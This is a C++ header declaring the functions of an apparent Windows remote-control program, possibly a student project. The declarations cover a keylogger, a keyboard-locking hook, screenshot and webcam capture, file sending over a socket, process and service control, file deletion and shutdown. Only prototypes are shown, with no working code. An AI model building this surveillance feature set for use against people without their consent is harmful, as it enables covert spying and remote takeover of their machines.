#pragma once
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <map>
#include <nlohmann/json.hpp>
#include <sstream>
#include <set>
#include <fstream>
#include <iomanip>
#include <fcntl.h>
#include <io.h>
#include <filesystem>
#include <locale>
#include <thread>
#include <atomic>
#include <opencv2/opencv.hpp>
#include <opencv2/core/utils/logger.hpp>
#include <chrono>

using namespace std;
using json = nlohmann::json;

extern HHOOK keyboardHook;
extern BOOL isConnected;
extern atomic<bool> isRecording;
extern thread webcamThread;

// process list apps
json listApps();
void writeAppListToFile(const vector<vector<string>>& apps);
vector<vector<string>> getRunningApps();

// process send file
bool sendFile(SOCKET&, string);

// process list services
string listServices();
string convertWideCharToString(LPCWSTR wideCharStr);
string getServiceDescription(SC_HANDLE hService);
string truncateString(const string& str, size_t maxLength);
vector<pair<string, tuple<int, string, string>>> listAllServices();
void writeServicesListToFile(const vector<pair<string, tuple<int, string, string>>>& services);

// process list processes
string listProcess();

// process start app
string startApp(string);

// process start service
string startService(string);

// process stop app
string stopApp(string);

// process stop service
string stopService(string);

// Hàm xử lý chức năng xóa file
string deleteFile(string& filePath);

string copyFile(const string&, const string&);

// Các hàm xử lý chức năng chụp màn hình
HBITMAP captureScreen(int& screenWidth, int& screenHeight);

bool saveScreenshotToFile(HBITMAP hBitmap, int width, int height);

bool saveBinaryToImage(const string& binaryData, const string& savePath);

void takeScreenshot();

// process keylogger
map<int, string> createKeyMap();
vector<string> collectKeyNames(int);
void writeKeyNamesToFile(vector<string>&);
string keyLogger(int);

// process key lock
LRESULT CALLBACK processLowLevelKeyboard(int nCode, WPARAM wParam, LPARAM lParam);
bool lockKeyboard();
string lockKey(bool& flag);
void runKeyLockingLoop();

// process key unlock
bool unlockKeyboard();
string unlockKey();

// process shutdown
void shutdown();

// process restart
void restart();

// process directory tree
bool isHiddenOrSystem(const filesystem::path&);
void printDirectoryTree(const filesystem::path&, wofstream&, int, int, int);
bool listDrivesAndPrintTree();
string getDirectoryTree();

// process start webcam
bool createWebcamVideo(int);
string startWebcam();

// process stop webcam
string stopWebcam();